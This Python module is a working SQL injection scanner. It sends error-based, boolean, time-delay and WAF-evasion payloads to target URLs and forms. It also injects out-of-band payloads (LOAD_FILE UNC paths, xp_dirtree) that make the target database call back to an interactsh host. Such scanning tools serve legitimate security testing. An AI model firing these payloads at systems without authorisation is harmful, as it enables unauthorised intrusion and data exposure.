"""
sqli_scanner.py — SQL Injection Scanner with OOB/OAST capability
=================================================================

Detection methods:
  1. Error-based    — DB error strings in response
  2. Boolean-blind  — TRUE vs FALSE response fingerprinting
  3. Time-based     — statistical baseline median (not flat threshold)
  4. OOB/OAST       — Out-of-band via interactsh DNS callbacks
                      Catches async blind SQLi that never reflects

Fixes vs previous version:
  - Boolean-blind: content fingerprint comparison, not just length
  - Time-based: 3-request baseline median, threshold = median + sleep - 1s
  - OOB: interactsh HTTP API (no binary install) for DNS/HTTP callbacks
  - WAF evasion payloads added
"""
from __future__ import annotations

import re
import time
import uuid
import statistics
import threading
from typing import Any, Dict, List, Optional, Tuple

import requests

requests.packages.urllib3.disable_warnings()


# ─────────────────────────────────────────────────────────────────────────────
# Error-based patterns
# ─────────────────────────────────────────────────────────────────────────────

SQL_ERROR_PATTERNS = [
    # MySQL
    r"you have an error in your sql syntax",
    r"warning: mysql",
    r"mysql_fetch_array\(\)",
    r"mysql_num_rows\(\)",
    r"supplied argument is not a valid mysql",
    # MSSQL
    r"unclosed quotation mark after the character string",
    r"microsoft.*odbc.*sql server",
    r"microsoft.*sql native client",
    r"incorrect syntax near",
    r"\[microsoft\]\[odbc",
    # Oracle
    r"ora-[0-9]{4,5}",
    r"oracle.*driver",
    r"quoted string not properly terminated",
    # PostgreSQL
    r"pg_query\(\):",
    r"pg_exec\(\):",
    r"postgresql.*error",
    r"psql.*error",
    r"unterminated quoted string at or near",
    # SQLite
    r"sqlite_error",
    r"sqlite3.*operationalerror",
    r"sqlite.exception",
    # Generic
    r"sql syntax.*mysql",
    r"warning.*mysqli",
    r"mysqli_query\(\)",
    r"pdoexception",
    r"sqlstate\[",
    r"db2.*sql.*error",
    r"sybase.*error",
    r"jet database engine",
    r"access database engine",
]

ERROR_PAYLOADS = [
    "'",
    '"',
    "';",
    '";',
    "' OR '1'='1",
    "' OR 1=1--",
    '" OR 1=1--',
    "1' ORDER BY 1--",
    "1' ORDER BY 2--",
    "1 UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "1; SELECT SLEEP(0)--",
]

BOOLEAN_TRUE_PAYLOADS  = ["' OR '1'='1", "' OR 1=1--", "1 OR 1=1", '" OR "1"="1']
BOOLEAN_FALSE_PAYLOADS = ["' OR '1'='2", "' OR 1=2--", "1 OR 1=2", '" OR "1"="2']

SLEEP_SECONDS   = 2
JITTER_TOLERANCE = 0.8  # seconds

TIME_PAYLOADS = {
    "mysql":    [f"' OR SLEEP({SLEEP_SECONDS})--", f"1; SELECT SLEEP({SLEEP_SECONDS})--"],
    "mssql":    [f"'; WAITFOR DELAY '0:0:{SLEEP_SECONDS}'--",
                 f"1; WAITFOR DELAY '0:0:{SLEEP_SECONDS}'--"],
    "postgres": [f"'; SELECT pg_sleep({SLEEP_SECONDS})--",
                 f"1; SELECT pg_sleep({SLEEP_SECONDS})--"],
    "oracle":   [f"' OR 1=1 AND 1=(SELECT 1 FROM dual WHERE 1=DBMS_PIPE.RECEIVE_MESSAGE(CHR(65),{SLEEP_SECONDS}))--"],
    "sqlite":   [f"' OR RANDOMBLOB(1000000000)--"],
}

WAF_BYPASS_PAYLOADS = [
    "'/**/OR/**/1=1--",
    "%27%20OR%201%3D1--",
    "' /*!OR*/ 1=1--",
    "'\tOR\t1=1--",
    "' OORR 1=1--",  # double-word bypass
    "' OR 0x313d31--",
]

# OOB payloads — %s replaced with interactsh subdomain
OOB_PAYLOADS = {
    "mysql":    [
        "' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\', '{oob}', '\\\\a'))--",
        "'; SELECT LOAD_FILE('\\\\\\\\{oob}\\\\a')--",
    ],
    "mssql":    [
        "'; EXEC master..xp_dirtree '//{oob}/a'--",
        "'; EXEC master..xp_fileexist '//{oob}/a'--",
    ],
    "generic":  [
        "' OR 1=(SELECT 1 FROM (SELECT SLEEP(0)) t WHERE 1=1 AND '{oob}' IS NOT NULL)--",
    ],
}


# ─────────────────────────────────────────────────────────────────────────────
# Interactsh OOB client (HTTP API — no binary install required)
# ─────────────────────────────────────────────────────────────────────────────

INTERACTSH_SERVER = "https://oast.pro"
INTERACTSH_POLL_WAIT = 3  # seconds to wait for async callbacks


class _InteractshClient:
    """
    Lightweight interactsh HTTP client.
    Uses ProjectDiscovery's hosted oast.pro — no Go binary, no install.
    """

    def __init__(self):
        self._domain:    Optional[str] = None
        self._token:     Optional[str] = None
        self._available: bool          = False
        self._injections: Dict[str, Dict] = {}  # oob_url -> {url, param}
        self._session = requests.Session()
        self._session.verify = False
        self._register()

    def _register(self):
        try:
            resp = self._session.post(
                f"{INTERACTSH_SERVER}/register",
                json={},
                timeout=10,
            )
            if resp.status_code == 200:
                data         = resp.json()
                self._domain = data.get("domain")
                self._token  = data.get("token")
                if self._domain:
                    self._available = True
                    print(f"[SQLiScanner] interactsh registered: *.{self._domain}")
        except Exception as e:
            print(f"[SQLiScanner] interactsh unavailable: {e} — OOB SQLi disabled")

    def generate_payload_url(self, tag: str) -> Optional[str]:
        """Generate a unique OOB callback URL for this injection."""
        if not self._available:
            return None
        return f"{tag}.{self._domain}"

    def register_injection(self, oob_url: str, target_url: str, param: str):
        """Track which injection corresponds to which OOB URL."""
        self._injections[oob_url] = {"url": target_url, "param": param}

    def poll_findings(self) -> List[Dict[str, Any]]:
        """
        Poll interactsh for callbacks. Call this after all injections.
        Returns list of findings for confirmed OOB callbacks.
        """
        if not self._available or not self._injections:
            return []

        print(f"[SQLiScanner] Waiting {INTERACTSH_POLL_WAIT}s for OOB callbacks...")
        time.sleep(INTERACTSH_POLL_WAIT)

        try:
            resp = self._session.get(
                f"{INTERACTSH_SERVER}/poll",
                params={"id": self._domain, "token": self._token},
                timeout=15,
            )
            if resp.status_code != 200:
                return []
            data      = resp.json()
            callbacks = data.get("data", [])
        except Exception as e:
            print(f"[SQLiScanner] interactsh poll error: {e}")
            return []

        findings = []
        for cb in callbacks:
            full_id = cb.get("full-id", "")
            protocol = cb.get("protocol", "dns")
            remote   = cb.get("remote-address", "")

            # Match callback to our injection
            for oob_url, info in self._injections.items():
                tag = oob_url.split(".")[0]
                if tag in full_id:
                    findings.append({
                        "type":       "sqli-oob",
                        "param":      info["param"],
                        "payload":    oob_url,
                        "evidence":   (
                            f"OOB {protocol.upper()} callback from {remote} "
                            f"to {oob_url}"
                        ),
                        "confidence": 95,
                        "url":        info["url"],
                        "method":     "oob",
                    })
                    break

        if findings:
            print(f"[SQLiScanner] OOB: {len(findings)} blind SQLi confirmed via DNS/HTTP callback")
        return findings


# ─────────────────────────────────────────────────────────────────────────────
# SQLi Scanner
# ─────────────────────────────────────────────────────────────────────────────

class SQLiScanner:

    def __init__(self, timeout: int = 10, session: Optional[requests.Session] = None):
        self.timeout  = timeout
        self.session  = session or requests.Session()
        self.session.verify = False
        self.session.headers.update({"User-Agent": "Mozilla/5.0 (VulnScanner)"})

        # Lazy-init OOB client only if needed
        self._oob: Optional[_InteractshClient] = None
        self._oob_lock = threading.Lock()

    def _get_oob(self) -> Optional[_InteractshClient]:
        with self._oob_lock:
            if self._oob is None:
                self._oob = _InteractshClient()
        return self._oob if self._oob._available else None

    # ------------------------------------------------------------------
    # Public scan methods
    # ------------------------------------------------------------------

    def scan_url(self, url: str, params: Dict[str, str]) -> List[Dict[str, Any]]:
        findings = []
        for param in params:
            result = self._scan_param(url, params, param)
            if result:
                findings.append(result)
        return findings

    def scan_form(self, form: Dict[str, Any]) -> List[Dict[str, Any]]:
        findings  = []
        action    = form.get("action", "")
        method    = form.get("method", "get").lower()
        inputs    = form.get("inputs", [])
        if not action:
            return []

        fields = {i.get("name", ""): i.get("value", "")
                  for i in inputs if i.get("name")}

        for field in list(fields.keys()):
            result = self._scan_form_field(action, method, fields, field)
            if result:
                findings.append(result)
        return findings

    def collect_oob_findings(self) -> List[Dict[str, Any]]:
        """
        Call after all scan_url/scan_form calls.
        Polls interactsh for OOB DNS/HTTP callbacks and returns findings.
        """
        if self._oob:
            return self._oob.poll_findings()
        return []

    # ------------------------------------------------------------------
    # Core param scanner
    # ------------------------------------------------------------------

    def _scan_param(self, url: str, params: Dict[str, str],
                    target_param: str) -> Optional[Dict[str, Any]]:
        """
        Try all detection methods in priority order.
        Returns first confirmed finding, or None.
        """
        # 1. Error-based (fastest, most reliable)
        result = self._error_based(url, params, target_param)
        if result:
            return result

        # 2. Boolean-blind
        result = self._boolean_blind(url, params, target_param)
        if result:
            return result

        # 3. Time-based (slowest — do last among in-band methods)
        result = self._time_based(url, params, target_param)
        if result:
            return result

        # 4. WAF bypass variants
        result = self._waf_bypass(url, params, target_param)
        if result:
            return result

        # 5. OOB (async — inject now, collect later via collect_oob_findings())
        self._oob_inject(url, params, target_param)

        return None

    def _scan_form_field(self, action: str, method: str,
                         fields: Dict[str, str], target: str) -> Optional[Dict[str, Any]]:
        baseline = self._get_form_response(action, method, fields)
        if not baseline:
            return None

        for payload in ERROR_PAYLOADS[:6]:
            test = dict(fields)
            test[target] = payload
            resp = self._get_form_response(action, method, test)
            if resp and self._has_sql_error(resp.text):
                return {
                    "type":       "sqli-error",
                    "param":      target,
                    "payload":    payload,
                    "evidence":   self._extract_error(resp.text),
                    "confidence": 92,
                    "url":        action,
                    "method":     "error-based",
                }

        return None

    # ------------------------------------------------------------------
    # Detection methods
    # ------------------------------------------------------------------

    def _error_based(self, url: str, params: Dict[str, str],
                     target: str) -> Optional[Dict[str, Any]]:
        for payload in ERROR_PAYLOADS:
            test = dict(params)
            test[target] = payload
            try:
                resp = self.session.get(url, params=test, timeout=self.timeout)
                if self._has_sql_error(resp.text):
                    return {
                        "type":       "sqli-error",
                        "param":      target,
                        "payload":    payload,
                        "evidence":   self._extract_error(resp.text),
                        "confidence": 92,
                        "url":        url,
                        "method":     "error-based",
                    }
            except Exception:
                continue
        return None

    def _boolean_blind(self, url: str, params: Dict[str, str],
                       target: str) -> Optional[Dict[str, Any]]:
        """
        Compare baseline vs TRUE vs FALSE responses using content fingerprinting.

        FIX vs original:
        - Uses (length, content_hash) fingerprint, not just length
        - Requires TRUE matches baseline AND differs from FALSE
        - This eliminates false positives from dynamic pages
        """
        try:
            baseline_resp = self.session.get(url, params=params, timeout=self.timeout)
            baseline_fp   = self._fingerprint(baseline_resp.text)
        except Exception:
            return None

        for true_p, false_p in zip(BOOLEAN_TRUE_PAYLOADS, BOOLEAN_FALSE_PAYLOADS):
            try:
                true_test        = dict(params)
                true_test[target] = true_p
                true_resp        = self.session.get(url, params=true_test, timeout=self.timeout)
                true_fp          = self._fingerprint(true_resp.text)

                false_test         = dict(params)
                false_test[target] = false_p
                false_resp         = self.session.get(url, params=false_test, timeout=self.timeout)
                false_fp           = self._fingerprint(false_resp.text)

            except Exception:
                continue

            # TRUE should match baseline, FALSE should differ from TRUE
            true_matches_baseline  = self._fingerprints_similar(baseline_fp, true_fp)
            true_differs_from_false = self._fingerprints_differ(true_fp, false_fp)

            if true_matches_baseline and true_differs_from_false:
                return {
                    "type":       "sqli-boolean-blind",
                    "param":      target,
                    "payload":    true_p,
                    "evidence": (
                        f"TRUE response matches baseline (len={true_fp[0]}), "
                        f"FALSE differs (len={false_fp[0]})"
                    ),
                    "confidence": 82,
                    "url":        url,
                    "method":     "boolean-blind",
                }

        return None

    def _time_based(self, url: str, params: Dict[str, str],
                    target: str) -> Optional[Dict[str, Any]]:
        """
        Statistical time-based detection using a 3-request baseline median.
        Threshold = median + SLEEP_SECONDS - JITTER_TOLERANCE

        FIX vs original: flat 4.0s threshold caused false positives on slow
        endpoints. Now we measure the actual baseline latency first.
        """
        # Measure baseline latency (2 requests — enough for median)
        baseline_times = []
        for _ in range(2):
            try:
                t0 = time.time()
                self.session.get(url, params=params, timeout=self.timeout)
                baseline_times.append(time.time() - t0)
            except Exception:
                return None

        if not baseline_times:
            return None

        baseline_median = statistics.median(baseline_times)
        threshold       = baseline_median + SLEEP_SECONDS - JITTER_TOLERANCE

        for db_type, payloads in TIME_PAYLOADS.items():
            for payload in payloads:
                test = dict(params)
                test[target] = payload
                try:
                    t0       = time.time()
                    self.session.get(url, params=test,
                                     timeout=self.timeout + SLEEP_SECONDS + 2)
                    elapsed  = time.time() - t0

                    if elapsed >= threshold:
                        return {
                            "type":       "sqli-time-blind",
                            "param":      target,
                            "payload":    payload,
                            "evidence": (
                                f"Response delayed {elapsed:.1f}s "
                                f"(baseline median={baseline_median:.1f}s, "
                                f"threshold={threshold:.1f}s, db={db_type})"
                            ),
                            "confidence": 80,
                            "url":        url,
                            "method":     "time-based",
                        }
                except Exception:
                    continue

        return None

    def _waf_bypass(self, url: str, params: Dict[str, str],
                    target: str) -> Optional[Dict[str, Any]]:
        for payload in WAF_BYPASS_PAYLOADS:
            test = dict(params)
            test[target] = payload
            try:
                resp = self.session.get(url, params=test, timeout=self.timeout)
                if self._has_sql_error(resp.text):
                    return {
                        "type":       "sqli-waf-bypass",
                        "param":      target,
                        "payload":    payload,
                        "evidence":   self._extract_error(resp.text),
                        "confidence": 85,
                        "url":        url,
                        "method":     "waf-bypass",
                    }
            except Exception:
                continue
        return None

    def _oob_inject(self, url: str, params: Dict[str, str], target: str):
        """
        Inject OOB payloads and register with interactsh.
        Does NOT wait for response — results collected via collect_oob_findings().
        """
        oob = self._get_oob()
        if not oob:
            return

        tag     = uuid.uuid4().hex[:8]
        oob_url = oob.generate_payload_url(tag)
        if not oob_url:
            return

        for db_type, payloads in OOB_PAYLOADS.items():
            for payload_template in payloads:
                payload = payload_template.replace("{oob}", oob_url)
                test    = dict(params)
                test[target] = payload
                try:
                    self.session.get(url, params=test,
                                     timeout=self.timeout)
                except Exception:
                    pass  # fire and forget — OOB doesn't need a response

        oob.register_injection(oob_url, url, target)

    # ------------------------------------------------------------------
    # Helpers
    # ------------------------------------------------------------------

    def _fingerprint(self, body: str) -> Tuple[int, str]:
        """Content fingerprint: (length, first 500 chars normalized)."""
        normalized = re.sub(r'\s+', ' ', body.lower())
        return (len(body), normalized[:500])

    def _fingerprints_similar(self, fp1: Tuple, fp2: Tuple,
                               len_tolerance: int = 50) -> bool:
        len_diff     = abs(fp1[0] - fp2[0])
        content_same = fp1[1] == fp2[1]
        return content_same or len_diff < len_tolerance

    def _fingerprints_differ(self, fp1: Tuple, fp2: Tuple,
                              len_tolerance: int = 50) -> bool:
        return not self._fingerprints_similar(fp1, fp2, len_tolerance)

    def _has_sql_error(self, body: str) -> bool:
        body_lower = body.lower()
        return any(re.search(p, body_lower) for p in SQL_ERROR_PATTERNS)

    def _extract_error(self, body: str) -> str:
        body_lower = body.lower()
        for pattern in SQL_ERROR_PATTERNS:
            m = re.search(pattern, body_lower)
            if m:
                start = max(0, m.start() - 20)
                end   = min(len(body), m.end() + 100)
                return body[start:end].strip()[:200]
        return "SQL error detected"

    def _get_form_response(self, action: str, method: str,
                            data: Dict[str, str]) -> Optional[requests.Response]:
        try:
            if method == "post":
                return self.session.post(action, data=data, timeout=self.timeout)
            return self.session.get(action, params=data, timeout=self.timeout)
        except Exception:
            return None